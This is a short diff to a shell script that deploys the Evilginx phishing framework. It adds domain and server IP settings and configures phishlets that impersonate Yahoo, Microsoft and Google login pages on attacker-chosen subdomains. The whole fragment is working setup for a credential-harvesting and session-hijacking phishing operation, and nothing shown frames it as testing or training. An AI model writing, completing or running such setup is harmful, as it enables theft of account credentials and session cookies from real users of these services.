@@ -614,6 +614,8 @@ EOF
     # Configure phishlets
     sleep 2
     /usr/local/bin/evilginx -c "$EVILGINX_DIR" -p "$EVILGINX_DIR/phishlets" << CMDS
+config domain $DOMAIN
+config ipv4 $VPS_IP
 phishlets hostname yahoo $EP1.$DOMAIN
 phishlets hostname microsoft $EP2.$DOMAIN
 phishlets hostname google $EP3.$DOMAIN
